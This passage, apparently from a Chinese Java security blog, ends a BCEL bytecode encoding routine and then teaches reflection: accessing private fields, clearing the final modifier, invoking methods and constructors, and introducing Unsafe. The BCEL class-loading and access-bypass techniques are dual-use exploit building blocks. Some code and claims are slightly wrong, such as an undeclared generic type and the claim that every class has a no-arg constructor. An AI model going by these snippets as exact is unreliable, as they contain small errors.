class="line"></span><br><span class="line">        <span class="comment">// 如果字节值在特殊字符范围内，执行特殊转义</span></span><br><span class="line">        <span class="keyword">if</span> (b &gt;= <span class="number">0</span> &amp;&amp; b &lt; FREE_CHARS) &#123;</span><br><span class="line">            out.write(CHAR_MAP[b]); <span class="comment">// 写入映射的字符（特殊字符转义）</span></span><br><span class="line">        &#125; <span class="keyword">else</span> &#123; <span class="comment">// 普通的转义操作</span></span><br><span class="line">            <span class="comment">// 将字节转换为十六进制字符串并转换为字符数组</span></span><br><span class="line">            <span class="type">char</span>[] tmp = Integer.toHexString(b).toCharArray();</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (tmp.length == <span class="number">1</span>) &#123;  <span class="comment">// 如果只有一个字符</span></span><br><span class="line">                out.write(<span class="string">&#x27;0&#x27;</span>);      <span class="comment">// 补充 0，使其成为 2 位十六进制数</span></span><br><span class="line">                out.write(tmp[<span class="number">0</span>]);   <span class="comment">// 写入该字符</span></span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;  <span class="comment">// 如果有两个字符</span></span><br><span class="line">                out.write(tmp[<span class="number">0</span>]);   <span class="comment">// 写入第一个字符</span></span><br><span class="line">                out.write(tmp[<span class="number">1</span>]);   <span class="comment">// 写入第二个字符</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>最后我们需要在编码后的字节码前面加上 <code>$$BCEL$$</code> 标识，这样 BCEL ClassLoader 就可以正确识别类的字节码并动态加载类。</p>
<h1 id="反射"><a href="#反射" class="headerlink" title="反射"></a>反射</h1><p>Java 反射（Reflection）机制是 Java 提供的一种非常强大的功能，它允许程序在运行时 <strong>动态地获取类的信息</strong>，并能够 <strong>操作类的方法、字段、构造器等成员</strong>。反射机制提供了对类、方法、字段等元数据的访问，而不需要在编译时提前知道这些信息。</p>
<p>反射机制的核心是 <strong><code>java.lang.reflect</code> 包</strong> 和 <strong><code>java.lang.Class</code> 类</strong>。</p>
<p>JVM 为每个加载的类创建了对应的 <code>java.lang.Class</code> 实例，并在该实例中保存了类的所有信息。因此，如果我们获取了某个类的 <code>Class</code> 实例，我们就可以通过这个 <code>Class</code> 实例获取到该实例对应  <code>java.lang.reflect</code> 包提供的一系列类的实例。通过获取到的这些实例，我们可以<strong>获取类的信息</strong>（如构造方法、字段、方法等），并能 <strong>操作对象的字段</strong> 或 <strong>调用方法</strong>。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="images/95cf25f872504b8597418ff8821ff793.png"
                      alt="在这里插入图片描述" style="zoom: 33%;" 
                ></p>
<ul>
<li><code>Method</code>：表示类中的方法，允许程序获取、调用类的方法。</li>
<li><code>Field</code>：表示类的字段，允许程序访问、修改对象的字段（包括私有字段）。</li>
<li><code>Constructor</code>：表示类的构造器，允许动态创建类的实例。</li>
</ul>
<h2 id="获取-Class-实例"><a href="#获取-Class-实例" class="headerlink" title="获取 Class 实例"></a>获取 Class 实例</h2><p>每个 Java 类在运行时都有一个唯一的 <code>Class</code> 对象，该对象包含了该类的所有信息。反射的前提就是先要获取到这个 <code>Class</code> 对象。通常我们有三种获取方式这个 <code>Class</code> 对象。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="images/3022d47fa0f749b3a0d75d17e0857fba.png"
                      alt="在这里插入图片描述" style="zoom:33%;" 
                ></p>
<h3 id="通过类名获取"><a href="#通过类名获取" class="headerlink" title="通过类名获取"></a>通过类名获取</h3><p>可以借助 <code>Class</code> 类的 <code>forName</code> 方法来获取 <code>Class</code> 实例，参数是目标类的<strong>全限定类名</strong>。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Class&lt;?&gt; clazz = Class.forName(<span class="string">&quot;com.example.MyClass&quot;</span>);</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p>在 Java 中，<strong>类名</strong>（Class Name）指的是用于标识<strong>类</strong>的名称。</p>
<p>Java 中的类名可能有多个相同的类名，这些类名可能位于不同的包中。为了区分它们，我们需要使用 <strong>全限定类名</strong>，即包含包名的类名。</p>
<p>例如：<code>java.util.ArrayList</code>，这里 <code>java.util</code> 是包名，<code>ArrayList</code> 是类名。整个字符串 <code>java.util.ArrayList</code> 就是该类的<strong>全限定类名</strong>。</p>
<p>由于 <code>Class</code> 实例存放着类的所有信息，因此我们可以通过 <code>Class</code> 的 <code>getName</code> 方法获取一个类的全限定名称。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">System.out.println(MyClass.class.getName());</span><br></pre></td></tr></table></figure></div>
</blockquote>
<h3 id="通过对象获取"><a href="#通过对象获取" class="headerlink" title="通过对象获取"></a>通过对象获取</h3><div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">MyClass</span> <span class="variable">obj</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">MyClass</span>();</span><br><span class="line">Class&lt;?&gt; clazz = obj.getClass();</span><br></pre></td></tr></table></figure></div>

<h3 id="通过类的-class-属性获取"><a href="#通过类的-class-属性获取" class="headerlink" title="通过类的 .class 属性获取"></a>通过类的 .class 属性获取</h3><div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Class&lt;?&gt; clazz = MyClass.class;</span><br></pre></td></tr></table></figure></div>

<h2 id="操作字段"><a href="#操作字段" class="headerlink" title="操作字段"></a>操作字段</h2><h3 id="获取字段"><a href="#获取字段" class="headerlink" title="获取字段"></a>获取字段</h3><p>反射提供了两种方法来获取字段信息：</p>
<ul>
<li><p><strong><code>getField(String name)</code></strong> ：获取<strong>公共字段</strong>（包括父类中的公共字段）。如果字段是私有的或保护的，它将抛出 <code>NoSuchFieldException</code> 异常。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Field <span class="title function_">getField</span><span class="params">(String name)</span> <span class="keyword">throws</span> NoSuchFieldException</span><br></pre></td></tr></table></figure></div>
</li>
<li><p><strong><code>getDeclaredField(String name)</code></strong> ：获取当前类<strong>声明的字段</strong>（包括<strong>私有字段</strong>，但<strong>不包括继承的字段</strong>）。如果字段不存在，则抛出 <code>NoSuchFieldException</code> 异常。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Field <span class="title function_">getDeclaredField</span><span class="params">(String name)</span> <span class="keyword">throws</span> NoSuchFieldException</span><br></pre></td></tr></table></figure></div></li>
</ul>
<p>另外对应获取到的私有字段，反射提供了 <code>setAccessible(boolean flag)</code> 方法来允许对私有字段的访问。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setAccessible</span><span class="params">(<span class="type">boolean</span> flag)</span> <span class="keyword">throws</span> SecurityException</span><br></pre></td></tr></table></figure></div>

<p>其中参数 <code>flag</code>：</p>
<ul>
<li>如果为 <code>true</code>，则表示允许访问字段（即使该字段是 <code>private</code>、<code>protected</code> 或包内字段）。</li>
<li>如果为 <code>false</code>，则恢复字段的访问控制。</li>
</ul>
<p>在 <code>getDeclaredField</code> 的基础上我们还可以循环遍历当前类的父类从而确保继承的字段也能获取到：</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 逐级获取字段，使用 while 循环并实现 getDeclaredField</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Field <span class="title function_">getDeclaredField</span><span class="params">(Class&lt;?&gt; clazz, String fieldName)</span> &#123;</span><br><span class="line">    <span class="comment">// 使用 while 循环遍历类及其父类</span></span><br><span class="line">    <span class="keyword">while</span> (clazz != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// 尝试获取当前类的指定字段</span></span><br><span class="line">            <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> clazz.getDeclaredField(fieldName);  <span class="comment">// 尝试获取字段</span></span><br><span class="line">            field.setAccessible(<span class="literal">true</span>);  <span class="comment">// 允许对私有字段的访问</span></span><br><span class="line">            </span><br><span class="line">            <span class="keyword">return</span> field;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NoSuchFieldException e) &#123;</span><br><span class="line">            <span class="comment">// 如果当前类没有该字段，则继续查找父类</span></span><br><span class="line">            clazz = clazz.getSuperclass();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 如果找不到字段，返回 null</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>反射还提供了 <code>getFields()</code> 和 <code>getDeclaredFields()</code> 方法来获取类的所有字段：</p>
<ul>
<li><p><strong><code>getFields()</code></strong> ：返回当前类及其父类中所有公共字段。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Field[] getFields() <span class="keyword">throws</span> SecurityException</span><br></pre></td></tr></table></figure></div>
</li>
<li><p><strong><code>getDeclaredField</code></strong> ：返回当前类中所有声明的字段（包括私有字段）。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Field[] getDeclaredFields() <span class="keyword">throws</span> SecurityException</span><br></pre></td></tr></table></figure></div></li>
</ul>
<h3 id="获取字段值"><a href="#获取字段值" class="headerlink" title="获取字段值"></a>获取字段值</h3><p>获取字段值是 Java 反射机制中的一个常见操作。我们可以使用 <code>Field</code> 对象的 <code>get(Object obj)</code> 方法可以来获取字段的值。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">get</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IllegalArgumentException, IllegalAccessException</span><br></pre></td></tr></table></figure></div>

<p>我们通常把获取字段值的操作封装成 <code>getFieldValue</code> 函数方便使用：</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">getFieldValue</span><span class="params">(Object object, String fieldName)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> object.getClass().getDeclaredField(fieldName);</span><br><span class="line">    field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="keyword">return</span> field.get(object);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>由于字段可能是从父类中继承的，因此我们可以使用前面实现的 <code>getDeclaredField</code> 函数来获取字段。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">getFieldValue</span><span class="params">(Object object, String fieldName)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    <span class="keyword">return</span> getDeclaredField(object.getClass(), fieldName).get(object);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h3 id="设置字段值"><a href="#设置字段值" class="headerlink" title="设置字段值"></a>设置字段值</h3><p>同样的，使用 <code>Field</code> 对象的 <code>set(Object obj, Object value)</code> 方法可以设置字段的值。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">set</span><span class="params">(Object obj, Object value)</span> <span class="keyword">throws</span> IllegalArgumentException, IllegalAccessException</span><br></pre></td></tr></table></figure></div>

<p>我们通常把获取字段值的操作封装成 <code>setFieldValue</code> 函数方便使用：</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object object, String fieldName, Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> object.getClass().getDeclaredField(fieldName);</span><br><span class="line">    field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    field.set(object, value);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>如果修改的字段可能是从父类中继承的，则使用前面实现的 <code>getDeclaredField</code> 函数来获取字段。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object object, String fieldName, Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    getDeclaredField(object.getClass(), fieldName).set(object, value);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h3 id="修改-final-变量"><a href="#修改-final-变量" class="headerlink" title="修改 final 变量"></a>修改 final 变量</h3><p>如果是 <code>final</code> 修饰的成员，即使通过反射也无法直接修改，这是由于 <code>Field</code> 对象的 <code>modifiers</code> 成员的 <code>FINAL</code> 位置位导致的。</p>
<p><code>Field</code> 对象的 <code>modifiers</code> 成员用于表示字段的访问修饰符（如 <code>public</code>、<code>private</code>、<code>static</code>、<code>final</code> 等）。这个成员变量是一个整数值，表示该字段的修饰符组合。我们可以先通过反射修改 <code>Field</code> 对象的 <code>modifiers</code> 成员，然后再反射修改成员变量。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object object, String fieldName, Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> getDeclaredField(object.getClass(), fieldName);</span><br><span class="line">    </span><br><span class="line">    <span class="type">Field</span> <span class="variable">modifiers</span> <span class="operator">=</span> getDeclaredField(field.getClass(), <span class="string">&quot;modifiers&quot;</span>);</span><br><span class="line">    modifiers.setInt(field, field.getModifiers() &amp; ~Modifier.FINAL);</span><br><span class="line">    </span><br><span class="line">    field.set(object, value);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>


  <div class="note-large red">
    <div class="notel-title rounded-t-lg p-3 font-bold text-lg flex flex-row gap-2 items-center">
      <p>注意</p>

    </div>
    <div class="notel-content">
      <p>我们在验证常量是否修改时不能直接通过属性访问获取常量的值。因为 Java 编译器在编译的时候会认为常量不可修改，导致直接通过属性访问获取常量值的操作的过程会被优化掉，导致获取的结果还是原来的值。</p>
<p>例如下面的测试代码中：</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">FinalTest</span> <span class="variable">test</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FinalTest</span>();</span><br><span class="line">setFieldValue(test,<span class="string">&quot;secret&quot;</span>,<span class="string">&quot;G0T_Y0U&quot;</span>);</span><br><span class="line">System.out.println(test.secret);</span><br><span class="line">System.out.println(getFieldValue(test,<span class="string">&quot;secret&quot;</span>));</span><br></pre></td></tr></table></figure></div>

<p><code>System.out.println(test.secret);</code> 的 <code>test.secret</code> 会被优化成 <code>secret</code> 原本的值造成常量未被修改的假象。</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">LDC &quot;Y0U_C4nNot_M0d1fy_M3&quot;</span><br><span class="line">INVOKEVIRTUAL java/io/PrintStream.println (Ljava/lang/String;)V</span><br></pre></td></tr></table></figure></div>

    </div>
  </div>

<h2 id="操作方法"><a href="#操作方法" class="headerlink" title="操作方法"></a>操作方法</h2><h3 id="获取方法"><a href="#获取方法" class="headerlink" title="获取方法"></a>获取方法</h3><p>反射提供了两种方法来获取类的方法信息：</p>
<ul>
<li><p><strong><code>getMethod(String name, Class&lt;?&gt;... parameterTypes)</code></strong> ：获取 <strong>公共方法</strong>（包括从父类继承的公共方法）。如果方法不存在或者不是 <code>public</code>，会抛出 <code>NoSuchMethodException</code>。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Method <span class="title function_">getMethod</span><span class="params">(String name, Class&lt;?&gt;... parameterTypes)</span> <span class="keyword">throws</span> NoSuchMethodException</span><br></pre></td></tr></table></figure></div>

<ul>
<li><strong><code>name</code></strong> ：方法名。</li>
<li><strong><code>parameterTypes</code></strong> ：方法参数类型列表。<strong>如果方法没有参数，可以传递空数组或省略。</strong></li>
</ul>
</li>
<li><p><strong><code>getDeclaredMethod(String name, Class&lt;?&gt;... parameterTypes)</code></strong> ：获取 <strong>当前类声明的方法</strong>（包括 <code>private</code> 和 <code>protected</code> 方法，但不包括继承的方法）。如果方法不存在，则抛出 <code>NoSuchMethodException</code>。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Method <span class="title function_">getDeclaredMethod</span><span class="params">(String name, Class&lt;?&gt;... parameterTypes)</span> <span class="keyword">throws</span> NoSuchMethodException</span><br></pre></td></tr></table></figure></div></li>
</ul>
<p>同样的，我们可以实现一个可以获取从父类继承的方法的 <code>getDeclaredMethod</code> 函数。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Method <span class="title function_">getDeclaredMethod</span><span class="params">(Class&lt;?&gt; clazz, String methodName, Class&lt;?&gt;... parameterTypes)</span> &#123;</span><br><span class="line">    <span class="comment">// 使用 while 循环遍历类及其父类</span></span><br><span class="line">    <span class="keyword">while</span> (clazz != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// 尝试获取当前类的指定方法</span></span><br><span class="line">            <span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> clazz.getDeclaredMethod(methodName, parameterTypes);</span><br><span class="line">            method.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            <span class="keyword">return</span> method;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NoSuchMethodException e) &#123;</span><br><span class="line">            <span class="comment">// 如果当前类没有该方法，则继续查找父类</span></span><br><span class="line">            clazz = clazz.getSuperclass();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 如果找不到方法，返回 null</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>反射还提供了 <code>getMethods()</code> 和 <code>getDeclaredMethods()</code> 方法来获取类的所有方法：</p>
<ul>
<li><p><strong><code>getMethods()</code></strong> ：返回当前类及其父类中所有公共方法。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Method[] getMethods() <span class="keyword">throws</span> SecurityException</span><br></pre></td></tr></table></figure></div>
</li>
<li><p><strong><code>getDeclaredMethods()</code></strong> ：返回当前类中所有声明的方法（包括私有方法）。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Method[] getDeclaredMethods() <span class="keyword">throws</span> SecurityException</span><br></pre></td></tr></table></figure></div></li>
</ul>
<h3 id="调用方法"><a href="#调用方法" class="headerlink" title="调用方法"></a>调用方法</h3><p>使用 <code>Method</code> 对象的 <code>invoke(Object obj, Object... args)</code> 方法可以调用类的方法。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">invoke</span><span class="params">(Object obj, Object... args)</span> <span class="keyword">throws</span> IllegalAccessException, IllegalArgumentException, InvocationTargetException</span><br></pre></td></tr></table></figure></div>

<ul>
<li><code>obj</code> 是调用方法的对象，<strong>如果方法是 <code>static</code>，需要传入 <code>null</code> 占位。</strong></li>
<li><code>args</code> 是方法的参数。</li>
</ul>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="images/8bc937d444c74ad898b27e30d6688afb.png"
                      alt="在这里插入图片描述" style="zoom:33%;" 
                >
对于连续调用的情况，由于反射调用时对象是作为参数传入的，因此方法的书写顺序发生改变。
  ![invoke](images/invoke.svg)

<h2 id="操作构造函数"><a href="#操作构造函数" class="headerlink" title="操作构造函数"></a>操作构造函数</h2><h3 id="获取构造函数"><a href="#获取构造函数" class="headerlink" title="获取构造函数"></a>获取构造函数</h3><p>Java 反射提供了两种方法来获取类的构造函数：</p>
<ul>
<li><p><strong><code>getConstructor(Class&lt;?&gt;... parameterTypes)</code></strong> ：获取 <strong>公共构造函数</strong>，如果当前类没有公共构造函数则尝试获取父类中的公共构造函数。如果找不到公共构造函数则会抛出 <code>NoSuchMethodException</code> 异常。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Constructor&lt;T&gt; <span class="title function_">getConstructor</span><span class="params">(Class&lt;?&gt;... parameterTypes)</span> <span class="keyword">throws</span> NoSuchMethodException</span><br></pre></td></tr></table></figure></div>

<ul>
<li><strong><code>parameterTypes</code></strong> ：构造函数参数类型列表。<strong>如果构造函数没有参数，可以传递空数组或省略。</strong></li>
</ul>
</li>
<li><p><strong><code>getDeclaredConstructor(Class&lt;?&gt;... parameterTypes)</code></strong> ：获取 <strong>当前类声明的构造函数</strong>（包括 <code>private</code> 和 <code>protected</code> 构造函数，但不包括继承的构造函数）。如果构造函数不存在，则抛出 <code>NoSuchMethodException</code>。</p>

  <div class="note-large red">
    <div class="notel-title rounded-t-lg p-3 font-bold text-lg flex flex-row gap-2 items-center">
      <p>注意</p>

    </div>
    <div class="notel-content">
      <p>即使没有显式定义构造函数，类总会有一个默认的无参构造函数。因此通过 <code>getDeclaredConstructor</code> 获取类的无参构造函数总能获取到</p>

    </div>
  </div>

<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Constructor&lt;T&gt; <span class="title function_">getDeclaredConstructor</span><span class="params">(Class&lt;?&gt;... parameterTypes)</span> <span class="keyword">throws</span> NoSuchMethodException</span><br></pre></td></tr></table></figure></div></li>
</ul>
<p>有些情况下，我们想要获取的构造函数位于父类中且访问类型不为 <code>public</code>，此时需要参考前面的方法使用逐级查找父类的方式来获取：</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Constructor&lt;?&gt; getDeclaredConstructor(Class&lt;?&gt; clazz, Class&lt;?&gt;... parameterTypes) &#123;</span><br><span class="line">    <span class="comment">// 使用 while 循环遍历类及其父类</span></span><br><span class="line">    <span class="keyword">while</span> (clazz != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Constructor&lt;T&gt; constructor = clazz.getDeclaredConstructor(parameterTypes);</span><br><span class="line">            constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            <span class="keyword">return</span> constructor;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NoSuchMethodException e) &#123;</span><br><span class="line">            clazz = clazz.getSuperclass();  <span class="comment">// 如果当前类没有该构造函数，则继续查找父类</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>反射还提供了 <code>getConstructors()</code> 和 <code>getDeclaredConstructors()</code> 方法来获取类的所有构造函数：</p>
<ul>
<li><p><strong><code>getConstructors()</code></strong> ：返回当前类及其父类中所有公共构造函数。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Constructor&lt;?&gt;[] getConstructors() <span class="keyword">throws</span> SecurityException</span><br></pre></td></tr></table></figure></div>
</li>
<li><p><strong><code>getDeclaredConstructors()</code></strong> ：返回当前类中所有声明的构造函数（包括私有构造函数）。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Constructor&lt;?&gt;[] getDeclaredConstructors() <span class="keyword">throws</span> SecurityException</span><br></pre></td></tr></table></figure></div></li>
</ul>
<h3 id="创建对象"><a href="#创建对象" class="headerlink" title="创建对象"></a>创建对象</h3><p>首先 <code>Class</code> 对象本身的 <code>newInstance</code> 方法可以调用类的无参构造函数创建类的实例。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> T <span class="title function_">newInstance</span><span class="params">()</span> <span class="keyword">throws</span> InstantiationException, IllegalAccessException;</span><br></pre></td></tr></table></figure></div>

<p>不过这个方法只能调用无参构造函数，且私有的构造函数无法调用，因此比较鸡肋。</p>
<p>另外从 Java 9 开始，<code>Class.newInstance()</code> 方法已经被标记为<strong>废弃</strong>（deprecated）。推荐使用 <code>Constructor.newInstance()</code> 代替它。</p>
<p>我们可以先获取类的<strong>指定构造函数</strong>对应的 <code>Constructor</code> 对象，然后调用 <code>Constructor</code> 对象的 <code>newInstance(Object... initargs)</code> 方法从而调用类的构造函数实例化类。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> T <span class="title function_">newInstance</span><span class="params">(Object... initargs)</span> <span class="keyword">throws</span> InstantiationException, IllegalAccessException, IllegalArgumentException, InvocationTargetException</span><br></pre></td></tr></table></figure></div>

<h2 id="Unsafe-类"><a href="#Unsafe-类" class="headerlink" title="Unsafe 类"></a>Unsafe 类</h2><p><code>sun.misc.Unsafe</code> 是 Java 中一个极为强大且危险的类。它提供了对底层内存和线程操作的直接访问能力，允许开发者绕过 Java 的安全机制、访问底层内存、进行 CAS 操作、创建对象、操作字段等。这种能力虽然强大，但使用不当极容易导致内存泄漏、程序崩溃、数据不一致，甚至破坏 JVM 的稳定性。</p>

